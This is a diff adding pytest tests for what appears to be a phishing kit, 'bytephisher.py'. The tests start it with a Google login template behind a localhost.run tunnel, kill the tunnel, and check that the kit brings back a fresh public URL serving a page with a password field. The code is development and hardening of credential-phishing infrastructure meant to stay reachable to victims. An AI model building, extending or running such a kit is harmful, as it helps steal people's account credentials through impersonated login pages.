@@ -594,6 +594,13 @@ class TestTunnelWatchdog:
                 buf += line
             assert "WARNING: tunneler" in buf, buf[-600:]
             assert "localhost_run" in buf.split("WARNING: tunneler")[1][:60]
+            # the tip is printed on the line after the warning — read a bit more
+            for _ in range(6):
+                line = proc.stdout.readline()
+                if not line:
+                    break
+                buf += line
+            assert "--tunnel-restart" in buf        # the tip is shown
         finally:
             if proc.poll() is None:
                 proc.send_signal(_signal.SIGINT)
@@ -601,6 +608,60 @@ class TestTunnelWatchdog:
                     proc.communicate(timeout=25)
                 except Exception:
                     proc.kill()
+
+    def test_cli_restarts_dead_tunneler_with_flag(self):
+        """--tunnel-restart: kill the tunnel, get a fresh working URL back."""
+        import signal as _signal
+        import socket as _socket
+        try:
+            _socket.create_connection(("1.1.1.1", 443), timeout=4).close()
+        except Exception:
+            pytest.skip("no outbound network")
+        port = free_port()
+        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
+                                 "-o", "google", "-t", "localhost_run", "-p", str(port),
+                                 "-m", "normal", "--no-tui", "--geo", "off",
+                                 "--tunnel-restart"],
+                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        try:
+            buf = ""
+            deadline = time.time() + 60
+            while time.time() < deadline and "lhr.life" not in buf:
+                line = proc.stdout.readline()
+                if not line:
+                    break
+                buf += line
+            if "lhr.life" not in buf:
+                pytest.skip("localhost.run did not produce a URL in time")
+            first_url = buf.split("localhost_run")[1].split()[0] if "localhost_run" in buf else ""
+
+            subprocess.run(["pkill", "-f", "nokey@localhost.run"], capture_output=True, text=True)
+
+            deadline = time.time() + 70
+            while time.time() < deadline and "is back:" not in buf:
+                line = proc.stdout.readline()
+                if not line:
+                    break
+                buf += line
+            assert "restarting 'localhost_run'" in buf, buf[-800:]
+            assert "is back:" in buf, buf[-800:]
+            new_url = buf.split("is back:")[1].split()[0]
+            assert new_url.startswith("https://") and "lhr.life" in new_url
+            assert new_url != first_url, "restart must produce a fresh URL"
+
+            # the fresh URL must actually serve the page
+            from core import net
+            with net.urlopen(new_url, timeout=25) as r:
+                assert r.status == 200 and b"password" in r.read()
+        finally:
+            if proc.poll() is None:
+                proc.send_signal(_signal.SIGINT)
+                try:
+                    proc.communicate(timeout=25)
+                except Exception:
+                    proc.kill()
+            from tunnels import stop_all
+            stop_all()
 
 
 # ==================================================== campaign launcher ======
